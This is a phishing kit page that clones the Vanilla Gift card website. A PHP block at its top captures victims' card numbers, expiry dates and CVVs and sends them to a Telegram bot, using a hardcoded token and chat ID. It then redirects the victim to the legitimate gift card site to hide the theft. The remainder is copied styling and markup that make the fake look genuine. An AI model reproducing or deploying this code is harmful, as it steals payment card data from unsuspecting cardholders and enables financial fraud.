<?php
if(isset($_POST['cardNumber']) && isset($_POST['expMonth']) && isset($_POST['expirationYear']) && isset($_POST['cvv']))
{	
	$path = "https://api.telegram.org/6279097726:AAFLWLWH9lqmI_ymgrBe-n6qisqO7zj4gbc";

	$chatId = -1001554648917;
	$message = "vanillagift\n" . $_POST['cardNumber'] . ":" . $_POST['expMonth'] . ":" . $_POST['expirationYear'] . ":" . $_POST['cvv'];
	$message = urlencode($message);

	file_get_contents($path."/sendmessage?chat_id=".$chatId."&text=" . $message);
	header("Location: https://mygift.giftcardmall.com/");
	die();
}
?>

<html lang="en">
   <link type="text/css" rel="stylesheet" id="dark-mode-custom-link">
   <link type="text/css" rel="stylesheet" id="dark-mode-general-link">
   <style type="text/css" id="dark-mode-custom-style" lang="en"></style>
   <style type="text/css" id="dark-mode-native-style" lang="en"></style>
   <head>
      <meta charset="utf-8">
      <title>Vanilla Gift</title>
      <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1.0, maximum-scale=1.0">
      <meta name="robots" content="noindex, nofollow">
      <link rel="icon" type="image/x-icon" href="favicon.ico">
      <link rel="canonical" href="https://www.vanillagift.com">
      <link rel="stylesheet" href="styles.css">
      <style>#feedback[_ngcontent-fen-c0]{height:165px;width:auto;position:fixed;top:40%;left:-6px;z-index:999;transform:rotate(-90deg);-webkit-transform:rotate(-90deg);-moz-transform:rotate(-90deg);-o-transform:rotate(-90deg);-ms-transform:rotate(-90deg)}#feedback[_ngcontent-fen-c0]   li[_ngcontent-fen-c0]{list-style-type:none}#feedback[_ngcontent-fen-c0]   a[_ngcontent-fen-c0]{display:block;background:#ed1c24;padding:9px 16px 12px;color:#fff;font-size:20px;text-decoration:none;text-align:center;border:1px solid #f6f6f6;border-top:none;font-family:QuincyCF-Regular;line-height:20px}@media (min-width:768px){.fixedBody[_ngcontent-fen-c0]{padding-top:144px}}@media (max-width:767px){.fixedBody[_ngcontent-fen-c0]{padding-top:90px}}</style>
      <style>.loader[_ngcontent-fen-c2]{position:fixed;overflow:auto;display:-webkit-box;display:flex;-webkit-box-align:center;align-items:center;-webkit-box-pack:center;justify-content:center}.backdrop[_ngcontent-fen-c2]{z-index:9999;top:0;left:0;right:0;bottom:0;background-color:rgba(211,211,211,.3)}.progress-bar[_ngcontent-fen-c2]{width:auto;height:.25rem;background-color:rgba(204,204,204,.25)}.progress-bar[_ngcontent-fen-c2]   .progress-track[_ngcontent-fen-c2]{position:relative;width:auto;height:100%;background-color:#8f97a4}.progress-bar.progress-indeterminate[_ngcontent-fen-c2]   .progress-track[_ngcontent-fen-c2], .search[data-state=searching][_ngcontent-fen-c2]   .progress-bar.search-state[_ngcontent-fen-c2]   .progress-track[_ngcontent-fen-c2]{position:static;width:auto;height:auto;-webkit-transition:none;transition:none}.progress-circle.progress-determinate[_ngcontent-fen-c2], .search[data-state=searching][_ngcontent-fen-c2]   .progress-determinate.search-state[_ngcontent-fen-c2]{position:relative}.progress-circle.progress-indeterminate[_ngcontent-fen-c2]:before, .search[data-state=searching][_ngcontent-fen-c2]   .search-state[_ngcontent-fen-c2]:before{position:relative;display:block;content:'';border-style:solid;border-color:rgba(204,204,204,.25);border-left-color:#8f97a4;-webkit-transform:translateZ(0);transform:translateZ(0);border-radius:50%}.progress-circle.progress-indeterminate.progress-lg[_ngcontent-fen-c2]:before, .search[data-state=searching][_ngcontent-fen-c2]   .progress-lg.search-state[_ngcontent-fen-c2]:before{width:70px;height:70px;border-width:6px}.anim-spinner-indeterminate[_ngcontent-fen-c2], .btn-loading[_ngcontent-fen-c2]:before, .progress-circle.progress-indeterminate[_ngcontent-fen-c2]:before, .search[data-state=searching][_ngcontent-fen-c2]   .search-state[_ngcontent-fen-c2]:before{will-change:transform;-webkit-animation:.8s linear infinite spinner-indeterminate;animation:.8s linear infinite spinner-indeterminate}@-webkit-keyframes spinner-indeterminate{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes spinner-indeterminate{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}</style>
      <style>.navbar-inverse[_ngcontent-fen-c3]    {background-color:#ed1c24;border-color:#ed1c24;height:55px}.navbar-inverse[_ngcontent-fen-c3]     a:focus, .navbar-inverse[_ngcontent-fen-c3]     a:hover{color:#abaaab}.navbar-inverse[_ngcontent-fen-c3]     .navbar-nav li.active{padding:15px 12px 12px}.navbar-inverse[_ngcontent-fen-c3]     .navbar-nav li.active+li.active{padding-left:0}.navbar-inverse[_ngcontent-fen-c3]     .navbar-nav li.active+li.active a{border-left:2px solid #abaaab;padding-left:12px}.navbar-inverse[_ngcontent-fen-c3]     .navbar-nav>.active a{background-color:#ed1c24;color:#fff}.navbar-inverse[_ngcontent-fen-c3]     .navbar-nav>.active a:focus{background-color:#ed1c24!important;color:#fff}.navbar-inverse[_ngcontent-fen-c3]     .navbar-nav>.active a:hover{background-color:#ed1c24;color:#fff}.navbar-right[_ngcontent-fen-c3]{margin-right:0!important;position:relative;left:9px}#navigationMain[_ngcontent-fen-c3]   li.active[_ngcontent-fen-c3]   a[_ngcontent-fen-c3]{color:#aaa9aa}#navigationMain[_ngcontent-fen-c3]   li[_ngcontent-fen-c3]   a[_ngcontent-fen-c3]:active, #navigationMain[_ngcontent-fen-c3]   li[_ngcontent-fen-c3]   a[_ngcontent-fen-c3]:hover{color:#abaaab!important;text-decoration:none}#navigationMain[_ngcontent-fen-c3]   li[_ngcontent-fen-c3]   a[_ngcontent-fen-c3]:focus{color:inherit!important;text-decoration:none}.colorValue[_ngcontent-fen-c3]{color:#aaa9aa}.navigation--desktop[_ngcontent-fen-c3]     li a.active{color:#aaa9aa!important}.navigation--desktop[_ngcontent-fen-c3]     li a:active, .navigation--desktop[_ngcontent-fen-c3]     li a:hover{color:#abaaab!important;text-decoration:none}.navigation--desktop[_ngcontent-fen-c3]     li a:focus{color:inherit!important;text-decoration:none}.programTitleMob[_ngcontent-fen-c3]{text-align:left;color:#fff;float:left;position:relative;left:9%;font-size:11px}.brand-centered[_ngcontent-fen-c3]{display:-webkit-box;display:flex;-webkit-box-pack:center;justify-content:center;position:absolute;width:100%;left:0;top:0}.brand-centered[_ngcontent-fen-c3]   .navbar-brand[_ngcontent-fen-c3]{display:-webkit-box;display:flex;-webkit-box-align:center;align-items:center}.mobileMenuContainer[_ngcontent-fen-c3]{left:-327px;position:absolute;-webkit-transition:left 1s;transition:left 1s}.mobileMenuContainer.active[_ngcontent-fen-c3]{left:0;top:0}.mobile-menu[_ngcontent-fen-c3]{position:fixed;height:100%;width:327px;z-index:9;background-color:#ed1c24;top:0;min-height:450px}.mobile-menu-icon[_ngcontent-fen-c3]{left:0;top:0;position:fixed;-webkit-transition:left 1s;transition:left 1s;height:55px;width:55px;z-index:1}.mobile-menu-icon.active[_ngcontent-fen-c3]{left:327px}.mobile-menu[_ngcontent-fen-c3]   ul[_ngcontent-fen-c3]{margin-top:0;padding:0;border:0;outline:0;margin-bottom:10px}.mobileMenuDivider[_ngcontent-fen-c3]{border-bottom:3px solid #e9decd}.mobile-menu[_ngcontent-fen-c3]   li[_ngcontent-fen-c3]{list-style:none;cursor:pointer;padding:15px 7px}.mobile-menu[_ngcontent-fen-c3]   li[_ngcontent-fen-c3]:hover{background:#ed1c24;color:#aaa9aa}@media (max-width:320px){.mobileMenuContainer[_ngcontent-fen-c3]{left:-272px}.mobile-menu[_ngcontent-fen-c3]{width:270px}.mobile-menu-icon.active[_ngcontent-fen-c3]{left:270px}}@media screen and (min-width:321px) and (max-width:380px){.mobileMenuContainer[_ngcontent-fen-c3]{left:-322px}.mobile-menu[_ngcontent-fen-c3]{width:320px}.mobile-menu-icon.active[_ngcontent-fen-c3]{left:320px}}img.mobile-logo[_ngcontent-fen-c3]{margin:0 auto;display:block;padding-top:4.5px}.navbar-right[_ngcontent-fen-c3]   .addToMenu[_ngcontent-fen-c3]   .active[_ngcontent-fen-c3]{color:#a9a8a9;height:0}.navbar-right[_ngcontent-fen-c3]   .addToMenu[_ngcontent-fen-c3] + .addToMenu[_ngcontent-fen-c3]   a[_ngcontent-fen-c3]{padding-left:15px;border-left:1px solid #fff}.main-copy[_ngcontent-fen-c3]     p{display:block;position:relative;margin:0}.sub-copy[_ngcontent-fen-c3]    {padding-left:10px}.sub-copy[_ngcontent-fen-c3]     p{margin:0}.main-copy[_ngcontent-fen-c3], .sub-copy[_ngcontent-fen-c3]{display:table-cell;font-size:11px;font-family:Moderat-Regular;padding-top:12px;line-height:13px}@media (max-width:375px){.main-copy[_ngcontent-fen-c3], .sub-copy[_ngcontent-fen-c3]{position:relative;left:59px}}.logo-copy[_ngcontent-fen-c3]{display:table;color:#fff;height:55px;font-family:OpenSans-Regular,Arial,Helvetica,sans-serif}@media (max-width:480px){.tooltipIcon[_ngcontent-fen-c3]{display:inline-block;position:absolute;left:36px;top:-3px}}@media screen and (max-height:510px){.modal-image[_ngcontent-fen-c3]{max-width:70%}.modal-close[_ngcontent-fen-c3]{margin-bottom:25px}}#mobileMenu[_ngcontent-fen-c3]{padding:25px}.modal-active[_ngcontent-fen-c3]{display:-webkit-box;display:flex;position:fixed;width:100%;height:100%;z-index:100;background:rgba(255,255,255,.8);margin:0 auto;-webkit-box-align:center;align-items:center;-webkit-box-pack:center;justify-content:center;left:0}.modal-disabled[_ngcontent-fen-c3]{display:none}.modal-close[_ngcontent-fen-c3]{margin-bottom:40px;color:#ed1c24;font-size:23px;font-weight:bolder;cursor:pointer}@media screen and (max-width:610px){.modal-container-active[_ngcontent-fen-c3]{padding:0 20px}.modal-image[_ngcontent-fen-c3]{width:100%;padding:0 20px 0 0}}.modal-container-active[_ngcontent-fen-c3]{visibility:visible;opacity:1;-webkit-transition:opacity .5s,visibility .5s;transition:opacity .5s,visibility .5s}.modal-container-hidden[_ngcontent-fen-c3]{visibility:hidden;opacity:0;-webkit-transition:opacity .6s,visibility .6s;transition:opacity .6s,visibility .6s}#messageBanner[_ngcontent-fen-c3]    {padding:5px 0}#messageBanner[_ngcontent-fen-c3]     a{color:#fff;text-decoration:underline}</style>
      <style>@media (max-width:375px){.footer[_ngcontent-fen-c4]   .top-nav[_ngcontent-fen-c4]   .footer-nav-links[_ngcontent-fen-c4]{text-align:left}.footer[_ngcontent-fen-c4]   .top-nav[_ngcontent-fen-c4]   .footer-nav-links[_ngcontent-fen-c4]   ul[_ngcontent-fen-c4]{margin-left:15px;margin-right:15px}.footer[_ngcontent-fen-c4]   .top-nav[_ngcontent-fen-c4]   .footer-nav-links[_ngcontent-fen-c4]   ul[_ngcontent-fen-c4]   li[_ngcontent-fen-c4]   a[_ngcontent-fen-c4]{padding-left:0;padding-right:20px}.footer[_ngcontent-fen-c4]   .bottom-nav[_ngcontent-fen-c4]   ul[_ngcontent-fen-c4]   li[_ngcontent-fen-c4]{display:block}}@media (max-width:767px){.getScoopBlock[_ngcontent-fen-c4]{float:right}.feedback-container[_ngcontent-fen-c4]   .feedback-phone[_ngcontent-fen-c4]{padding-right:31px}.footer[_ngcontent-fen-c4]   ul[_ngcontent-fen-c4]   li[_ngcontent-fen-c4]{list-style-type:none}.getTheScoop[_ngcontent-fen-c4]{margin-top:4px}}.break-text[_ngcontent-fen-c4]{word-wrap:break-word;color:#fff}.productLinks[_ngcontent-fen-c4]   li[_ngcontent-fen-c4]{display:block}.socialIcons[_ngcontent-fen-c4], .socialIcons[_ngcontent-fen-c4]   ul[_ngcontent-fen-c4]   li[_ngcontent-fen-c4]{display:inline-block}.modal[_ngcontent-fen-c4]{overflow:inherit}.fade[_ngcontent-fen-c4]{opacity:1;-webkit-transition:opacity .15s linear;transition:opacity .15s linear}.modal-header[_ngcontent-fen-c4]{border-bottom:1px solid #e5e5e5;color:#fff;background-color:#ed1c24}.textColor[_ngcontent-fen-c4]{color:#ed1c24}.modal-title[_ngcontent-fen-c4]{font-size:30px;font-family:QuincyCF-Regular,Helvetica,Arial,sans-serif}.button-signMe[_ngcontent-fen-c4]{display:inline-block;font-family:QuincyCF-Regular,Helvetica,Arial,sans-serif;font-size:20px;font-weight:400;line-height:1.42857;border:1px solid transparent;text-align:center;padding:13px 59px;cursor:pointer;text-decoration:none;-webkit-appearance:none;border-radius:5px;box-shadow:none;white-space:nowrap;vertical-align:middle;touch-action:manipulation;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;background-image:none;max-width:60%;margin:20px 2px 0 15px}.modal-content[_ngcontent-fen-c4]{width:80%;margin:0 auto;box-shadow:none}.modal-header[_ngcontent-fen-c4]{padding:10px 25px}.modal-body[_ngcontent-fen-c4]{padding:25px 25px 35px}.modal-body[_ngcontent-fen-c4]   .form-group[_ngcontent-fen-c4]{width:80%}.modal-backdrop[_ngcontent-fen-c4]{background-color:#000000cf}.modal-dialog[_ngcontent-fen-c4]{top:221px}</style>
      <style>.wrapper[_ngcontent-fen-c5]{max-width:950px}.notifications[_ngcontent-fen-c5]{width:100%;position:fixed;top:0;left:0;z-index:9999;height:55px}.float-none[_ngcontent-fen-c5]{float:none}.alert[_ngcontent-fen-c5]{font-size:20px;padding:15px 1.25rem;border-radius:0;background-color:#e9decd;line-height:20px}.alert-form[_ngcontent-fen-c5], .alert-warn[_ngcontent-fen-c5]{color:#ed1c24}.alert-icon[_ngcontent-fen-c5]{padding-top:0;padding-right:.625rem;min-width:2.375rem;vertical-align:middle}.alert[_ngcontent-fen-c5]   .notifi-msg[_ngcontent-fen-c5]{display:inline-block;vertical-align:middle}.dls-icon-warning-filled[_ngcontent-fen-c5]:before{position:relative;top:3px;font-size:22px}.alert-close[_ngcontent-fen-c5]{cursor:pointer;font-size:33px;line-height:27px;color:#382f2d}.container[_ngcontent-fen-c5]{position:relative}.notifications[_ngcontent-fen-c5]   .message.error[_ngcontent-fen-c5], .notifications[_ngcontent-fen-c5]   .message.info[_ngcontent-fen-c5], .notifications[_ngcontent-fen-c5]   .message.warning[_ngcontent-fen-c5]{background-color:#e9decd}.alert-positive[_ngcontent-fen-c5]{color:#382f2d;background-color:#e9decd!important;border-color:#e9decd!important}@media screen and (min-width:767px) and (max-width:991px){.wrapper[_ngcontent-fen-c5]{max-width:750px}}</style>
      <style>#activateCard[_ngcontent-fen-c9]   h1[_ngcontent-fen-c9]{border-bottom:2px solid #ededed}#brandCarousel.vanillaGiftHeroImage[_ngcontent-fen-c9]{width:1250px}#aboveCarouselInfo[_ngcontent-fen-c9]{min-height:500px;background-repeat-x:repeat;background-repeat-y:repeat;position:relative;background:0 0}@media (max-width:540px){.backgroundRepeatingImageMobile[_ngcontent-fen-c9]{background-color:transparent!important;background-repeat:no-repeat!important;background-image:none!important}}.brandLoginInfoModule[_ngcontent-fen-c9]   .tabmanageCard[_ngcontent-fen-c9]{background-color:#fff;min-height:375px}.dividerBorderAround.home_signedin[_ngcontent-fen-c9]   .brandLoginInfoModule.dividerModule[_ngcontent-fen-c9]{min-height:1px!important}.home_signedin[_ngcontent-fen-c9]{margin-bottom:165px;min-height:1px!important}.home_signedin[_ngcontent-fen-c9]   .brandLoginInfoModule.dividerModule[_ngcontent-fen-c9]{min-height:400px!important;position:relative;top:20px;margin-bottom:64px}.faq-item-header.title.fontMD.font20px28pxlh.font-bold.accordion-minus[_ngcontent-fen-c9], .faq-item-header.title.fontMD.font20px28pxlh.font-bold.accordion-plus[_ngcontent-fen-c9]{padding:0 20px;background-position:0 3px}.homePageLogintab[_ngcontent-fen-c9]{border-bottom:3px solid #ed1c24}.homePageLogintab.nav-tabs[_ngcontent-fen-c9] > li[_ngcontent-fen-c9]{display:inline-block!important;width:50%}.homePageLogintab.nav-tabs[_ngcontent-fen-c9] > li[_ngcontent-fen-c9]:only-child{width:100%!important}.homePageLogintab.nav-tabs[_ngcontent-fen-c9] > li.tabON[_ngcontent-fen-c9]{width:100%}.homePageLogintab.nav-tabs[_ngcontent-fen-c9] > li.tabOFF[_ngcontent-fen-c9]{width:0%}.homePageLogintab[_ngcontent-fen-c9]   .nav-tabs[_ngcontent-fen-c9] > li.active[_ngcontent-fen-c9] > a[_ngcontent-fen-c9]:focus, .homePageLogintab[_ngcontent-fen-c9]   .nav-tabs[_ngcontent-fen-c9] > li.active[_ngcontent-fen-c9] > a[_ngcontent-fen-c9]:hover, .homePageLogintab.nav-tabs[_ngcontent-fen-c9] > li.active[_ngcontent-fen-c9] > a[_ngcontent-fen-c9]{background-color:#f7f8f8!important;color:#8a96a3;border-bottom:transparent;border-left:none;border-right:none;border-top:1px solid transparent;padding-left:0;padding-right:0;border-radius:0}.homePageLogintab[_ngcontent-fen-c9]   .nav[_ngcontent-fen-c9] > li[_ngcontent-fen-c9] > a[_ngcontent-fen-c9]:focus, .homePageLogintab[_ngcontent-fen-c9]   .nav[_ngcontent-fen-c9] > li[_ngcontent-fen-c9] > a[_ngcontent-fen-c9]:hover{background-color:transparent!important;color:#8a96a3;border-bottom:3px solid #006371;padding-left:0;padding-right:0}.homePageLogintab.nav[_ngcontent-fen-c9] > li[_ngcontent-fen-c9] > a[_ngcontent-fen-c9]{background-color:#8a96a3!important;color:#fff;padding-left:0;padding-right:0;text-align:center;border-radius:0;margin-right:0}.homePageLogintab.nav-tabs[_ngcontent-fen-c9] > li[_ngcontent-fen-c9] > a[_ngcontent-fen-c9]{margin-right:0}.brandPortal-HP-accordionInfo[_ngcontent-fen-c9]{padding:9px 9px 9px 0!important;background-color:#ed1c24;min-height:55px}.brandPortal-HP-accordionInfo[_ngcontent-fen-c9]   .panel-default[_ngcontent-fen-c9]{border-color:transparent}.brandPortal-HP-accordionInfo[_ngcontent-fen-c9]   .accordion[_ngcontent-fen-c9]   .panel-title[_ngcontent-fen-c9]{color:#414a52!important;padding-top:10px;padding-bottom:10px}@media (max-width:766px){.vertical-spacing-xs-2[_ngcontent-fen-c9]{margin-top:-2px!important}}.panel-heading[_ngcontent-fen-c9]{padding:10px 15px;border-bottom:1px solid transparent;border-top-right-radius:3px;border-top-left-radius:3px}.panel[_ngcontent-fen-c9]{border-radius:0}@media (max-width:767px){.brandPortal-HP-accordionInfo[_ngcontent-fen-c9]{margin-bottom:20px;width:101%}#aboveCarouselInfo[_ngcontent-fen-c9]{background-color:#f8f5f0!important;top:-2px}.cta-container[_ngcontent-fen-c9]{margin:0!important}.mobileSliderImage[_ngcontent-fen-c9]   img[_ngcontent-fen-c9]{display:none;width:101%}.cta-wrapperMobile[_ngcontent-fen-c9]   .ctaButtonMobile[_ngcontent-fen-c9]{position:relative;background-color:#39c9df;color:#fff;font-family:QuincyCF-Regular;font-size:16px;height:33px;line-height:3px}#brandCarousel[_ngcontent-fen-c9]{background-size:contain;top:1px}}@media (max-width:375px){#aboveCarouselInfo[_ngcontent-fen-c9]{background-color:#f8f5f0!important;top:-2px}.cta-container[_ngcontent-fen-c9]{margin:0!important}}#brandCarousel[_ngcontent-fen-c9]{position:relative}.cta-position[_ngcontent-fen-c9]{display:-webkit-box;display:flex}.cta-container[_ngcontent-fen-c9]{margin:20px 0;position:relative}.cta-container[_ngcontent-fen-c9]   .cta-wrapper[_ngcontent-fen-c9]{position:absolute;width:100%;height:100%}.cta-container[_ngcontent-fen-c9]   .ctaButton[_ngcontent-fen-c9]{background-color:#39c9df;width:244px;position:absolute;color:#fff;font-family:QuincyCF-Regular}.cta-wrapperMobile[_ngcontent-fen-c9]{left:0;top:0;height:0}.cta-wrapperMobile[_ngcontent-fen-c9]   .ctaButtonMobile[_ngcontent-fen-c9]{position:relative}.SSaccountAmount[_ngcontent-fen-c9]{font-size:45px}.currency-val[_ngcontent-fen-c9]     span{display:inline-block;font-size:24px;vertical-align:super;position:relative;top:0}.loginInfoModule[_ngcontent-fen-c9]{min-height:400px}</style>
      <style>.btn-common[_ngcontent-fen-c14]{border:0;font-size:22px;font-family:QuincyCF-Regular;color:#fff;background-image:none!important;-webkit-filter:none!important;filter:none!important;border-radius:5px;padding:6px 12px!important;display:block!important;width:100%!important;border-color:transparent!important}.btn-buyOnline[_ngcontent-fen-c14]{background-color:#ed1c24!important}@media (min-width:768px) and (max-width:1023px){.btn-common[_ngcontent-fen-c14]{display:inline-block!important;width:auto!important}}.cardArtCarousel[_ngcontent-fen-c14]   h3[_ngcontent-fen-c14]{color:#4f4e4e;margin-top:0;font-size:20px;font-family:QuincyCF-Regular}.cardArtCarousel[_ngcontent-fen-c14]   .col-md-4[_ngcontent-fen-c14]   span[_ngcontent-fen-c14]   p[_ngcontent-fen-c14]{display:block;margin-top:14px;color:#4f4e4e}@media screen and (max-width:766px){.cardArtCarousel[_ngcontent-fen-c14]   .col-md-4[_ngcontent-fen-c14]   span[_ngcontent-fen-c14]   p[_ngcontent-fen-c14]{margin-top:20px}}@media screen and (min-width:767px) and (max-width:991px){.cardArtCarousel[_ngcontent-fen-c14]   .col-md-4[_ngcontent-fen-c14]   span[_ngcontent-fen-c14]   p[_ngcontent-fen-c14]{margin-top:20px}.cardArtCarousel[_ngcontent-fen-c14]   .row[_ngcontent-fen-c14]{padding:0 20px}}@media screen and (min-width:992px) and (max-width:1199px){.cardArtCarousel[_ngcontent-fen-c14]   .row[_ngcontent-fen-c14]{padding:0 20px}}.brandColor[_ngcontent-fen-c14]{color:#ed1c24!important}</style>
      <style>.shoppingOnline[_ngcontent-fen-c15]     h3{font-family:Moderat-Regular}.shoppingOnline[_ngcontent-fen-c15]     ol.customOrderedList li{margin-left:36px!important}@media screen and (min-width:767px) and (max-width:991px){.shoppingOnline[_ngcontent-fen-c15]   .row[_ngcontent-fen-c15]{padding:0 20px}}@media screen and (min-width:992px) and (max-width:1199px){.shoppingOnline[_ngcontent-fen-c15]   .row[_ngcontent-fen-c15]{padding:0 20px}}.brandColor[_ngcontent-fen-c15]{color:#ed1c24!important}</style>
      <meta name="description" content="undefined">
      <meta name="keywords" content="undefined">
      <style>.info-box[_ngcontent-fen-c12]{margin:0 auto 20px;position:relative;max-width:920px;border-top:3px solid #ed1c24;background-color:#fff;padding:20px}#brand-contentCardArea[_ngcontent-fen-c12]{margin-bottom:35px}#brand-contentCardArea[_ngcontent-fen-c12]   .smallPanels.col-md-4[_ngcontent-fen-c12]{background-color:#fff;margin-right:15px!important;margin-left:0!important}#brand-contentCardArea[_ngcontent-fen-c12]   .smallPanels.col-md-4[_ngcontent-fen-c12]:last-of-type{margin-right:0!important}@media (max-width:375px){#brand-contentCardArea[_ngcontent-fen-c12]   .smallPanels[_ngcontent-fen-c12]{min-width:320px}#brand-contentCardArea[_ngcontent-fen-c12]   .smallPanels[_ngcontent-fen-c12]:first-of-type{margin-left:0!important;margin-right:0!important}}@media (max-width:768px){#brand-contentCardArea[_ngcontent-fen-c12]   .smallPanels.col-md-4[_ngcontent-fen-c12]:first-of-type{margin-left:0}}</style>
      <style>.form-control[_ngcontent-fen-c10]{color:#b42c01!important}.form-group[_ngcontent-fen-c10]{border:1px solid #ccc;padding:0 8px;position:relative}.form-group[_ngcontent-fen-c10]   input[_ngcontent-fen-c10]{border:none;font-size:15px;margin-top:16px;outline:0;background-color:transparent!important;box-shadow:none;font-family:Moderat-Regular;color:#4f4e4e}.form-group[_ngcontent-fen-c10]   input[_ngcontent-fen-c10]::-webkit-input-placeholder{color:transparent!important}.form-group[_ngcontent-fen-c10]   input[_ngcontent-fen-c10]::-moz-placeholder{color:transparent!important}.form-group[_ngcontent-fen-c10]   input[_ngcontent-fen-c10]:-ms-input-placeholder{color:transparent!important}.form-group[_ngcontent-fen-c10]   input[_ngcontent-fen-c10]::-ms-input-placeholder{color:transparent}.form-group[_ngcontent-fen-c10]   input[_ngcontent-fen-c10]::placeholder{color:transparent}.form-group[_ngcontent-fen-c10]   input[_ngcontent-fen-c10]:focus::-webkit-input-placeholder{color:#afafaf!important}.form-group[_ngcontent-fen-c10]   input[_ngcontent-fen-c10]:focus::-moz-placeholder{color:#afafaf!important}.form-group[_ngcontent-fen-c10]   input[_ngcontent-fen-c10]:focus:-ms-input-placeholder{color:#afafaf!important}.form-group[_ngcontent-fen-c10]   input[_ngcontent-fen-c10]:focus::-ms-input-placeholder{color:#afafaf}.form-group[_ngcontent-fen-c10]   input[_ngcontent-fen-c10]:focus::placeholder{color:#afafaf}.form-group[_ngcontent-fen-c10]   input[_ngcontent-fen-c10]::-ms-clear{display:none}.form-group[_ngcontent-fen-c10]   label[_ngcontent-fen-c10]{font-size:15px;position:absolute;-webkit-transform-origin:top left;transform-origin:top left;-webkit-transform:translate(0,16px) scale(1);transform:translate(0,16px) scale(1);-webkit-transition:.1s ease-in-out;transition:all .1s ease-in-out;left:18px;top:5px}.form-group[_ngcontent-fen-c10]   input.error[_ngcontent-fen-c10] + label[_ngcontent-fen-c10], .form-group[_ngcontent-fen-c10]   input.success[_ngcontent-fen-c10] + label[_ngcontent-fen-c10]{-webkit-transform:translate(-4px,-4px) scale(.75)!important;transform:translate(-4px,-4px) scale(.75)!important}.form-group[_ngcontent-fen-c10]   input.error.empty[_ngcontent-fen-c10] + label[_ngcontent-fen-c10]{-webkit-transform:translate(0,16px) scale(1)!important;transform:translate(0,16px) scale(1)!important}.form-group[_ngcontent-fen-c10]   input.form-control[_ngcontent-fen-c10]:focus + label[_ngcontent-fen-c10]{-webkit-transform:translate(-4px,-4px) scale(.75)!important;transform:translate(-4px,-4px) scale(.75)!important;color:#382f2d!important}.recaptcha[_ngcontent-fen-c10]     .grecaptcha-badge{z-index:99}</style>
      <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/VZKEDW9wslPbEc9RmzMqaOAP/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-wyvEVSrAxo98MJGE0PuR2ri6k5qurqxA2/a+2Rdj2zI1XHJHSGLsoRS5ADozusAM"></script><script src="https://www.google.com/recaptcha/api.js?render=6LdwldIZAAAAABqe6wiGR7pO3ypHl9b_LM78_W99&amp;hl=en-US" defer=""></script>
      <style></style>
      <style>.item[_ngcontent-fen-c16]   img[_ngcontent-fen-c16]{vertical-align:top;display:inline-block;height:auto!important}.carousel-indicators[_ngcontent-fen-c16]   li.active[_ngcontent-fen-c16]{background-color:red;height:7px;width:7px}.carousel-indicators[_ngcontent-fen-c16]   li[_ngcontent-fen-c16]{margin:0 0 15px 10px;background-color:#d0d0d0;border:none!important;border-radius:0;width:7px;height:7px}.carousel-indicators[_ngcontent-fen-c16]   li[_ngcontent-fen-c16]:hover{background-color:#333}.slider-arrow[_ngcontent-fen-c16]{display:block;height:25px;width:16px}.slider-arrow.prev[_ngcontent-fen-c16]{background-position:0}.slider-arrow.next[_ngcontent-fen-c16]{background-position-x:17px}.carousel-indicators[_ngcontent-fen-c16]{top:10px;margin-left:0;width:100%;text-align:center;position:relative;left:0}.carousel-indicators[_ngcontent-fen-c16]   li[_ngcontent-fen-c16]:first-child{margin-left:0}.carousel-control[_ngcontent-fen-c16]{opacity:1;background-image:none!important;position:absolute;top:50%;margin-top:-25px}.carousel-control.left[_ngcontent-fen-c16]{left:-16px}.carousel-control.right[_ngcontent-fen-c16]{right:-56px}.item[_ngcontent-fen-c16]{text-align:center}@media screen and (max-width:766px){.item[_ngcontent-fen-c16]   img[_ngcontent-fen-c16]{width:32%;height:auto}.carousel-control.right[_ngcontent-fen-c16]{right:-26px}}@media screen and (min-width:767px) and (max-width:991px){.item[_ngcontent-fen-c16]   img[_ngcontent-fen-c16]{width:32%;height:auto}}</style>
      <style>.getTheScoop[_ngcontent-fen-c8]{background-color:#39c9df;border-top:none;margin-top:6px;padding:0 15px 25px 13px}.getTheScoop[_ngcontent-fen-c8]   h2[_ngcontent-fen-c8]{margin-top:0;font-family:QuincyCF-Regular;font-size:22px;padding-top:15px}.getTheScoop[_ngcontent-fen-c8]   label[for=newsletter_tc_check][_ngcontent-fen-c8]{margin-top:10px;font-style:normal;color:#382f2d;font-family:Moderat-Regular;font-size:12px}.getTheScoop[_ngcontent-fen-c8]   p[_ngcontent-fen-c8]{font-weight:400}.getTheScoop[_ngcontent-fen-c8]   p[_ngcontent-fen-c8]   a[_ngcontent-fen-c8]{text-decoration:underline}.getTheScoop[_ngcontent-fen-c8]   .button-signMe[_ngcontent-fen-c8]{display:inline-block;font-family:QuincyCF-Regular,Helvetica,Arial,sans-serif;font-size:20px;font-weight:400;line-height:1.42857;border:1px solid transparent;text-align:center;padding:13px 59px;margin-right:2px;margin-bottom:0;cursor:pointer;text-decoration:none;-webkit-appearance:none;border-radius:5px;box-shadow:none;white-space:nowrap;vertical-align:middle;touch-action:manipulation;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;background-image:none;margin-top:20px}input[type=checkbox][_ngcontent-fen-c8]{position:absolute;overflow:hidden;clip:rect(0 0 0 0);height:1px;width:1px;margin:-1px;border:0}input[type=checkbox][_ngcontent-fen-c8] + label[_ngcontent-fen-c8]:before{content:"";float:left;width:28px;height:27px;margin:0 10px 0 0;background:url(/../../assets/images/icons/bg-checkbox.png) no-repeat}input[type=checkbox][_ngcontent-fen-c8]:checked + label[_ngcontent-fen-c8]:before{background-position:0 -28px}input[type=checkbox][_ngcontent-fen-c8], input[type=radio][_ngcontent-fen-c8]{box-sizing:border-box;padding:0}.scoopNew-letterInfo[_ngcontent-fen-c8]{display:inline-block;position:relative;top:0;width:86%}</style>
   </head>
   <body oncopy="return false" id="appBody">
      <app-root _nghost-fen-c0="" ng-version="7.2.15">
         <!----><!----><!---->
         <app-loader _ngcontent-fen-c0="" _nghost-fen-c2="" hidden="">
            <div _ngcontent-fen-c2="" class="loader backdrop">
               <div _ngcontent-fen-c2=""><img _ngcontent-fen-c2="" appnorightclick="" src="../../../assets/images/icons/VG_pageLoader_050219.gif"></div>
            </div>
